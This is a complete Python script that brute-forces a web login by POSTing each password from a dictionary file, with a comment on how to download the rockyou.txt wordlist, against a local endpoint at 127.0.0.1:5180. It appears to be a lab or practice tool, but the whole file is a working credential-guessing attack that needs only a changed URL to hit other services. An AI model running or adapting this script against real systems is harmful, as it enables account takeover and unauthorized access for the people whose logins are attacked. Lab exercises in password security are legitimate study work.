#!/usr/bin/env python3
# Download the password dictionary: # wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
# to use, run: python brute_force_password.py --username <USERNAME> --password_dictionary <FILE_NAME>




import argparse
import json
import requests

def main(username, password_dictionary):
    url = "http://127.0.0.1:5180/login"

    with open(password_dictionary, "r") as file:
        for password in file:
            password = password.strip()
            print(f"Trying password: {password}")

            data = {
                "username": username,
                "password": password
            }

            response = requests.post(url, json=data)
            http_status_code = response.status_code

            if http_status_code == 200:
                print(f"Password found: {password}")
                break
            elif http_status_code == 401:
                print(f"Incorrect password: {password}")
            else:
                print(f"Unexpected status code: {http_status_code}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--username", type=str, required=True, help="The username to use for login attempts")
    parser.add_argument("--password_dictionary", type=str, required=True, help="Path to the password dictionary file")

    args = parser.parse_args()
    main(args.username, args.password_dictionary)
